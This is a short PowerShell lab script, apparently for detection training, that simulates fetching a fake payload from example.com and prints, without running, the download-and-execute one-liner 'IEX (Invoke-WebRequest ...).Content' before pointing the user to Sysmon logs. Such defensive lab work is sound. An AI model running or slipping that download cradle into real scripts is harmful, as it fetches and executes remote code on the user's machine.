# Attack 02: Suspicious PowerShell download simulation (lab only)

# 1. Set a fake URL (no real malware)
$url = "https://example.com/fakepayload.ps1"

Write-Host "[*] Simulating download from:" $url

# 2. Download content (harmless example)
try {
    $script = Invoke-WebRequest -Uri $url -UseBasicParsing
    Write-Host "[*] Simulated payload content length:" $script.Content.Length
} catch {
    Write-Host "[!] Could not reach URL. This is fine for the lab."
}

# 3. Show what an attacker might do (but don't execute)
Write-Host "[*] Example attacker command (DO NOT RUN):"
Write-Host "    IEX (Invoke-WebRequest -Uri $url).Content"

Write-Host "[*] Now check Sysmon logs for powershell.exe and network events."
